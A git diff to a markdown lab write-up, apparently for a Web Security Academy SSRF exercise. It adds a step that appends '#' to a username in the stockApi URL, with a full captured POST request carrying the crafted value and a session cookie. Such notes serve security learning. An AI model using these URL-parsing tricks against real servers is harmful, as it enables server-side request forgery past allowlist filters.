@@ -364,11 +364,35 @@ It is an application protocol used over an IP network to manage and access the d
  
  ## Respotion 
  
-     HTTP/1.1 500 Internal Server Error
-Content-Type: text/html; charset=utf-8
-Connection: close
-Content-Length: 2322
+    HTTP/1.1 500 Internal Server Error
+    Content-Type: text/html; charset=utf-8
+    Connection: close
+    Content-Length: 2322
  
+ ## Step 3.
+ 
+ Append a # to the username and observe that the URL is now rejected. 
+ 
+ ## Request 
+ 
+   POST /product/stock HTTP/1.1
+Host: 0a6a006303baa1a4c01303c000920096.web-security-academy.net
+Cookie: session=orjDJcIcVUXUwmiMWq57rynkY2ZmXrQI
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0a6a006303baa1a4c01303c000920096.web-security-academy.net/product?productId=1
+Content-Type: application/x-www-form-urlencoded
+Origin: https://0a6a006303baa1a4c01303c000920096.web-security-academy.net
+Content-Length: 48
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+stockApi=http://username#stock.weliketoshop.net/
  
  
  
